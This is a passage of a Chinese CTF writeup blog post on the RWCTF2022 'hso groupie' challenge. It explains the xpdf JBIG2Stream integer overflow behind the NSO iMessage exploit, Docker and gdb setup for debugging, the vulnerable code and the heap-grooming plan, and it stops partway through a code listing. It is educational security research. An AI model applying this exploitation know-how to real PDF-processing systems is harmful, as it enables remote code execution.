<!DOCTYPE html>


<html lang="zh-CN">


<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="RWCTF,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
   
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    RWCTF2022 Pwn 笔记3 - hso groupie Writeup |  Kiprey&#39;s Blog
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  
<link rel="stylesheet" href="/css/custom.css">

  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  
<script>
var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();
</script>


<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
</head>

</html>

<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-rwctf2022_hso"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  RWCTF2022 Pwn 笔记3 - hso groupie Writeup
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/02/rwctf2022_hso/" class="article-date">
  <time datetime="2022-02-01T16:00:00.000Z" itemprop="datePublished">2022-02-02</time>
</a>   
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">11.3k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">52 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="简介">简介</h2>
<p>这里是复盘 RWCTF2022 中 <code>hso groupie</code> 题时所写下的一些笔记，考点来源于 Project Zero 的 <strong>A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution</strong> 一文。</p>
<p>整体的做题思路主要由 Riatre 师傅的 exploit 中所推导出，换句话说，这里的笔记主要是对 <a href="https://github.com/Riatre/hso-groupie/tree/master/exploit" target="_blank" rel="noopener">作者 exploit</a> 的解释说明。</p>
<p>由于这题同样也较为复杂，因此需要单独开一个博文来记录。</p>
<blockquote>
<p>联合作者：sakura</p>
</blockquote>
<a id="more"></a>
<h2 id="一、小叙">一、小叙</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Help check how secure our latest PaaS (Pdftohtml-as-a-Service) is!</span><br><span class="line">Pick your favorite bug from this bloody list, or really, just exploit that bug so your exploit would also work on latest Poppler [1] and maybe even KItinerary.</span><br><span class="line">The container image is also available on Docker Hub.</span><br><span class="line">[1] Yeah, turns out propagating bug fixes between different Clone-and-Own codebases takes time :)</span><br><span class="line">socat -t90 stdio tcp-connect:47.242.147.191:31337</span><br><span class="line">attachment</span><br><span class="line"></span><br><span class="line">Clone-and-Pwn, difficulty:hard</span><br></pre></td></tr></table></figure>
<p>这题是 clone-and-pwn，源码没有做任何改变，就是通过查看最近提交的漏洞修复记录来发掘并利用漏洞。</p>
<h2 id="二、环境搭建">二、环境搭建</h2>
<h3 id="1-本地环境搭建">1. 本地环境搭建</h3>
<blockquote>
<p>这一题是在 debian 下编译的，因此对于 debian 系统来说，有些系统可以直接跑 exp（例如我的 XD）。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.xpdfreader.com/xpdf-4.03.tar.gz</span><br><span class="line">tar -zxvf xpdf-4.03.tar.gz</span><br><span class="line"><span class="built_in">cd</span> xpdf-4.03</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_CXX_FLAGS=<span class="string">"-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0"</span> ..</span><br><span class="line">make -j `nproc` </span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目还给了一个 `GNU C Library (Debian GLIBC 2.33-2) release` 的 glibc 附件</span></span><br><span class="line">patchelf --replace-needed libc.so.6 <span class="variable">$&#123;PWD&#125;</span>/../../libc.so.6 ./xpdf/pdftohtml</span><br></pre></td></tr></table></figure>
<p>启动方式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpdf/pdftohtml &lt;pdf-path&gt; --</span><br></pre></td></tr></table></figure>
<h3 id="2-exploit-调试环境搭建">2. exploit 调试环境搭建</h3>
<p>去 <a href="https://github.com/Riatre/hso-groupie/tree/master/chall" target="_blank" rel="noopener">题目环境</a> 这里下载 dockerfile 等题目环境，之后给 dockerfile 打 patch：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/Dockerfile</span></span><br><span class="line"><span class="comment">+++ b/Dockerfile</span></span><br><span class="line">@@ -8,7 +8,7 @@ RUN cd /tmp/xpdf-4.03 &amp;&amp; \</span><br><span class="line">     mkdir build &amp;&amp; \</span><br><span class="line">     cd build &amp;&amp; \</span><br><span class="line">     cmake -DCMAKE_BUILD_TYPE=Release \</span><br><span class="line"><span class="deletion">-        -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro" .. &amp;&amp; \</span></span><br><span class="line"><span class="addition">+        -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0 " .. &amp;&amp; \</span></span><br><span class="line">     make -j$(nproc)</span><br><span class="line"></span><br><span class="line"> FROM debian:unstable-20211220-slim</span><br><span class="line">@@ -20,6 +20,7 @@ RUN echo "deb [check-valid-until=no] http://snapshot.debian.org/archive/debian/2</span><br><span class="line">     apt-get install -y fonts-arkpandora fonts-noto fonts-dejavu fonts-font-awesome fonts-lato fonts-powerline gsfonts &amp;&amp; \</span><br><span class="line">     apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br><span class="line"> COPY --from=build /tmp/xpdf-4.03/build/xpdf/pdftohtml /usr/local/bin/</span><br><span class="line"><span class="addition">+COPY gdbserver /usr/bin/gdbserver</span></span><br><span class="line"> RUN mkdir -p /run/secrets &amp;&amp; echo 'rwctf&#123;flag placeholder&#125;' &gt; /run/secrets/flag</span><br><span class="line"></span><br><span class="line"><span class="deletion">-ENTRYPOINT [ "/bin/sh", "-c", "/usr/local/bin/pdftohtml \"$@\"", "--" ]</span></span><br><span class="line">\ No newline at end of file</span><br><span class="line"><span class="addition">+ENTRYPOINT [ "/bin/sh"]</span></span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure>
<p>修改目的主要是把 gdbserver 放进镜像里，以及让入口点停在 <code>/bin/sh</code>，而不直接启动 pdftohtml。</p>
<blockquote>
<p>这里要注意 COPY 命令的源路径，这里是直接使用相对路径。</p>
</blockquote>
<p>执行 <code>build.sh</code>，执行完成后可以检查一下镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  chall git:(master) docker image ls         </span><br><span class="line">REPOSITORY             TAG                      IMAGE ID       CREATED             SIZE</span><br><span class="line">hsogroupie&#x2F;pdftohtml   latest                   042e72a0f133   45 minutes ago      946MB</span><br></pre></td></tr></table></figure>
<p>启动 docker 镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 1234:1234 -v sakura_volume:&#x2F;tmp&#x2F;chall --cap-add&#x3D;SYS_PTRACE --security-opt seccomp&#x3D;unconfined --name hsogroupie hsogroupie&#x2F;pdftohtml</span><br></pre></td></tr></table></figure>
<p>该命令非常长，解构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run --help</span><br><span class="line"></span><br><span class="line">-i : 进入交互模式</span><br><span class="line">-t : 分配一个伪shell</span><br><span class="line">-d : 在后台以守护模式运行容器</span><br><span class="line">-p : 宿主机端口:容器端口，将容器端口映射到宿主机端口，这里都指定1234就好了</span><br><span class="line">-v : 挂载数据卷</span><br><span class="line">--cap-add&#x3D;SYS_PTRACE --security-opt seccomp&#x3D;unconfined : Docker默认禁用PTRACE功能，需要指定这个命令</span><br><span class="line">--name : 给容器声明一个名字</span><br></pre></td></tr></table></figure>
<p>这里挂载数据卷需要额外说明（参考<a href="https://www.cnblogs.com/edisonchou/p/docker_volumes_introduction.html" target="_blank" rel="noopener">这篇文章</a>）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker volume create sakura_volume &#x2F;&#x2F; 创建一个自定义容器卷</span><br><span class="line">docker volume ls &#x2F;&#x2F; 查看所有容器卷</span><br><span class="line">docker volume inspect sakura_volume &#x2F;&#x2F; 查看指定容器卷详情信息</span><br><span class="line">...</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;CreatedAt&quot;: &quot;2022-02-02T01:29:55+08:00&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Mountpoint&quot;: &quot;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;sakura_volume&#x2F;_data&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;sakura_volume&quot;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>然后我们对 <code>/var/lib/docker/volumes/sakura_volume/_data</code> 的修改就会映射到容器的 <code>/tmp/chall</code> 里，传输文件就比较方便。</p>
<p>启动完了之后我们可以 <code>docker ps</code> 一下看看有没有问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  chall git:(master) docker ps -a                     </span><br><span class="line">CONTAINER ID   IMAGE                  COMMAND     CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">15f265c337c0   hsogroupie&#x2F;pdftohtml   &quot;&#x2F;bin&#x2F;sh&quot;   34 minutes ago   Up 34 minutes   0.0.0.0:1234-&gt;1234&#x2F;tcp, :::1234-&gt;1234&#x2F;tcp   hsogroupie</span><br></pre></td></tr></table></figure>
<p>生成 exp pdf，注意要对 submodule 初始化，不然没有 jbig2enc 库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Riatre&#x2F;hso-groupie.git</span><br><span class="line">cd hso-groupie&#x2F;exploit</span><br><span class="line">git submodule update --init</span><br><span class="line">cd ..</span><br><span class="line">sudo cp -r exploit &#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;sakura_volume&#x2F;_data</span><br></pre></td></tr></table></figure>
<p>然后我们进入 docker 容器里对应数据卷的 exploit 目录下，应该要 install 这些安装包，要是少了就自己补一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install make g++ python3 pybind11-dev python3-dev python2 python2-dev</span><br><span class="line">make</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root@15f265c337c0:&#x2F;tmp&#x2F;chall&#x2F;exploit# make</span><br><span class="line">g++ -O3 -std&#x3D;c++20 -shared -fPIC jbig2arith.cc jbig2arith.h jbjbarith.cc jbjbarith.h -ojbjbarith.cpython-39-x86_64-linux-gnu.so -I&#x2F;usr&#x2F;include&#x2F;python3.9 -I&#x2F;usr&#x2F;include&#x2F;python3.9</span><br><span class="line">python3 sploit.py</span><br><span class="line">python2 pdf.py sploit &gt; sploit.pdf</span><br></pre></td></tr></table></figure>
<p>调试 exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 15f265c337c0 bash</span><br></pre></td></tr></table></figure>
<p>进入容器的 bash 环境，然后启动 gdbserver</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf output &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;gdbserver :1234 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pdftohtml &#x2F;tmp&#x2F;chall&#x2F;exploit&#x2F;sploit.pdf output</span><br></pre></td></tr></table></figure>
<p>这里的 output 是随便给一个文件夹名就行了，这是 pdftohtml 必须的启动参数，它会创建这个文件夹，并输出一个结果到这个文件夹里，并且它不能是已经存在的文件夹，而 sploit.pdf 就是我们生成出来的 exp pdf 文件。</p>
<p>然后在宿主机也启动 gdb，然后 <code>target remote:1234</code>，然后随便下个断点看看效果，注意因为 docker 里的源码路径和我宿主机的源码路径并不一致，所以要用 <code>substitute-path</code> 做个转换，建议写个 gdb 脚本完成这个事情，后面就不用一直自己敲了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br><span class="line">set substitute-path  &#x2F;tmp&#x2F;xpdf-4.03&#x2F;xpdf &#x2F;home&#x2F;sakura&#x2F;ctf&#x2F;hso-groupie&#x2F;chall&#x2F;xpdf-4.03&#x2F;xpdf</span><br><span class="line">b findSegment</span><br><span class="line">c</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> ► 0x555555675179    mov    r8, qword ptr [rax]</span><br><span class="line">   0x55555567517c    cmp    dword ptr [r8 + 8], esi</span><br><span class="line">   0x555555675180    jne    0x555555675170                &lt;0x555555675170&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x555555675170    add    rax, 8</span><br><span class="line">   0x555555675174    cmp    rax, rdx</span><br><span class="line">   0x555555675177    je     0x555555675190                &lt;0x555555675190&gt;</span><br><span class="line">───────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────</span><br><span class="line">In file: &#x2F;home&#x2F;sakura&#x2F;ctf&#x2F;hso-groupie&#x2F;chall&#x2F;xpdf-4.03&#x2F;xpdf&#x2F;JBIG2Stream.cc</span><br><span class="line">   4036 JBIG2Segment *JBIG2Stream::findSegment(Guint segNum) &#123;</span><br><span class="line">   4037   JBIG2Segment *seg;</span><br><span class="line">   4038   int i;</span><br><span class="line">   4039 </span><br><span class="line">   4040   for (i &#x3D; 0; i &lt; globalSegments-&gt;getLength(); ++i) &#123;</span><br><span class="line"> ► 4041     seg &#x3D; (JBIG2Segment *)globalSegments-&gt;get(i);</span><br><span class="line">   4042     if (seg-&gt;getSegNum() &#x3D;&#x3D; segNum) &#123;</span><br><span class="line">   4043       return seg;</span><br><span class="line">   4044     &#125;</span><br><span class="line">   4045   &#125;</span><br><span class="line">   4046   for (i &#x3D; 0; i &lt; segments-&gt;getLength(); ++i) &#123;</span><br><span class="line">───────────────────────────────────────────[ STACK ]────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffdd28 —▸ 0x555555676c72 ◂— mov    r12, rax</span><br><span class="line">01:0008│     0x7fffffffdd30 ◂— 0x0</span><br><span class="line">02:0010│     0x7fffffffdd38 ◂— 0x0</span><br><span class="line">03:0018│     0x7fffffffdd40 —▸ 0x555561ec0f00 ◂— 0x200000001</span><br><span class="line">04:0020│     0x7fffffffdd48 —▸ 0x555561f40c64 ◂— 0x203a100000000</span><br><span class="line">05:0028│     0x7fffffffdd50 ◂— 0x0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────</span><br><span class="line"> ► f 0   0x555555675179</span><br><span class="line">   f 1   0x555555676c72</span><br><span class="line">   f 2   0x555555679198 JBIG2Stream::readSegments()+1032</span><br><span class="line">   f 3   0x555555679473 JBIG2Stream::reset()+211</span><br><span class="line">   f 4   0x55555560139a</span><br><span class="line">   f 5   0x5555556494a9</span><br><span class="line">   f 6   0x55555564aba0</span><br><span class="line">   f 7   0x55555563c9e5</span><br></pre></td></tr></table></figure>
<p>现在我们就完成了整个调试环境的搭建。</p>
<h2 id="三、漏洞点">三、漏洞点</h2>
<p>这题预期的解法是使用这篇 google project zero 的 <a href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html" target="_blank" rel="noopener">iMessage exploit</a> 中的漏洞。漏洞点位于 <code>JBIG2Stream</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::readTextRegionSeg</span><span class="params">(Guint segNum, GBool imm,</span></span></span><br><span class="line"><span class="function"><span class="params">                    GBool lossless, Guint length,</span></span></span><br><span class="line"><span class="function"><span class="params">                    Guint *refSegs, Guint nRefSegs)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  Guint numSyms;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// get symbol dictionaries and tables</span></span><br><span class="line">  codeTables = <span class="keyword">new</span> GList();</span><br><span class="line">  <span class="comment">// 1. 初始时为 0</span></span><br><span class="line">  numSyms = <span class="number">0</span>;  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nRefSegs; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((seg = findSegment(refSegs[i]))) &#123;</span><br><span class="line">      <span class="keyword">if</span> (seg-&gt;getType() == jbig2SegSymbolDict) &#123;</span><br><span class="line">        <span class="comment">// 2. 该变量与一个用户可控的值相加，会造成整数溢出</span></span><br><span class="line">        numSyms += ((JBIG2SymbolDict *)seg)-&gt;getSize();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (seg-&gt;getType() == jbig2SegCodeTable) &#123;</span><br><span class="line">        codeTables-&gt;append(seg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// get the symbol bitmaps</span></span><br><span class="line">  <span class="comment">// 3. 整数溢出后，这里分配了一个较小的堆内存（指针数组）</span></span><br><span class="line">  syms = (JBIG2Bitmap **)gmallocn(numSyms, <span class="keyword">sizeof</span>(JBIG2Bitmap *));</span><br><span class="line">  kk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nRefSegs; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((seg = findSegment(refSegs[i]))) &#123;</span><br><span class="line">      <span class="keyword">if</span> (seg-&gt;getType() == jbig2SegSymbolDict) &#123;</span><br><span class="line">        symbolDict = (JBIG2SymbolDict *)seg;</span><br><span class="line">        <span class="comment">// 4. 将各个指针写入该堆内存，触发堆溢出</span></span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; symbolDict-&gt;getSize(); ++k) &#123;</span><br><span class="line">          syms[kk++] = symbolDict-&gt;getBitmap(k);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于恶意构造的 <code>refSegs</code> 中，一些 <code>seg-&gt;getSize()</code> 值很大（4GB），因此如果全部写进则肯定会触发 crash。所以在实际的漏洞利用中，会尝试先做做堆风水：</p>
<p><img src="/2022/02/rwctf2022_hso/1.jpg" alt="img"></p>
<p>看图，exploit 需要将 <strong>segments GList 的后备存储</strong>，放置在<strong>刚刚创建的溢出堆块</strong>的<strong>高地址</strong>处。这样触发堆溢出时，就能在执行前几个正常 size 的写入操作时，<strong>将后备存储中的那个超大 size 所对应的 segment 指针，替换成非 JBIG2SymbolDict 类型的 segment 指针（即 JBIG2Bitmap 类型）</strong>。之后当程序检索这个 segment 指针时，就会跳过该指针的检索。</p>
<h2 id="四、漏洞利用前置知识">四、漏洞利用前置知识</h2>
<h3 id="1-JBIG2Decode">1. JBIG2Decode</h3>
<p>漏洞点位于 JBIG2Stream ，而 JBIG2Stream 又怎么存在于 pdf 中呢？</p>
<p>pdf 文件结构本质上是一个树状图，这里给出一个使用 JBIG2Stream 的 pdf 片段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">4 0 obj</span><br><span class="line">&lt;&lt; &#x2F;Filter &#x2F;FlateDecode</span><br><span class="line">&#x2F;Length 3988</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&#x2F;* [MyStream1] *&#x2F;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">5 0 obj</span><br><span class="line">&lt;&lt; &#x2F;DecodeParms  &lt;&lt; &#x2F;JBIG2Globals 4 0 R &gt;&gt;</span><br><span class="line">&#x2F;Width 1024</span><br><span class="line">&#x2F;ColorSpace &#x2F;DeviceGray</span><br><span class="line">&#x2F;Height 1</span><br><span class="line">&#x2F;Filter &#x2F;JBIG2Decode</span><br><span class="line">&#x2F;Subtype &#x2F;Image</span><br><span class="line">&#x2F;Length 418248</span><br><span class="line">&#x2F;Type &#x2F;XObject</span><br><span class="line">&#x2F;BitsPerComponent 1</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&#x2F;* [MyStream2] *&#x2F;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure>
<blockquote>
<p>pdf 文件中，<code>4 0 obj</code>、<code>5 0 obj</code> 都是表示一个特定的 pdf object。</p>
</blockquote>
<p>其中，<code>4 0 obj</code> 标识了下面中的 <code>MyStream1</code>，其参数 <code>/Filter /FlateDecode</code> 表示该流是使用 zlib 压缩。</p>
<p>继续往下看可以看到： <code>5 0 obj</code> 中，<code>/DecodeParms</code> 引用了 <code>4 0 obj</code> 中的 stream 流，即 <code>MyStream1</code>；同时参数 <code>/Filter /JBIG2Decode</code> 指定了接下来的流 <code>MyStream2</code> 使用的解码方式是 <code>JBIG2Decode</code>。</p>
<p>因此从上文可以得知，<code>MyStream2</code> 使用 <strong>JBIG2Decode</strong> 进行解码，其解码参数为上面引用的这个 <code>4 0 obj</code>，即 <code>MyStream1</code> 使用 <code>FlateDecode</code> <strong>所解码后的流</strong>，而该参数的键为 <code>JBIG2Globals</code>。</p>
<p>而我们要做的，就是精心构建 <code>MyStream1</code> 和 <code>MyStream2</code>（这两个流都是 JBIG2Stream），使其在解析这两个 Stream 时能触发漏洞，从而 get shell。</p>
<p>构建好这两个流后，可以使用 <a href="https://github.com/agl/jbig2enc/blob/master/pdf.py" target="_blank" rel="noopener">jbig2enc/pdf.py</a> 来创建出 pdf。</p>
<h3 id="2-Segments-小叙">2. Segments 小叙</h3>
<blockquote>
<p>注，这一节中，每个 segment 所对应的代码最好亲自阅读一下。</p>
</blockquote>
<p>当 xpdf 对 JBIG2Stream 解码时，正如上节中所示，JBIG2Decode 需要一个参数 <code>JBIG2Globals</code>。因此在解析时，会先解析 <code>JBIG2Globals</code> 的 stream，之后再解析下面的 main stream。以下代码说明了 stream 的解析过程：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::reset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    GList *t;</span><br><span class="line"></span><br><span class="line">    segments = <span class="keyword">new</span> GList();</span><br><span class="line">    globalSegments = <span class="keyword">new</span> GList();</span><br><span class="line"></span><br><span class="line">    <span 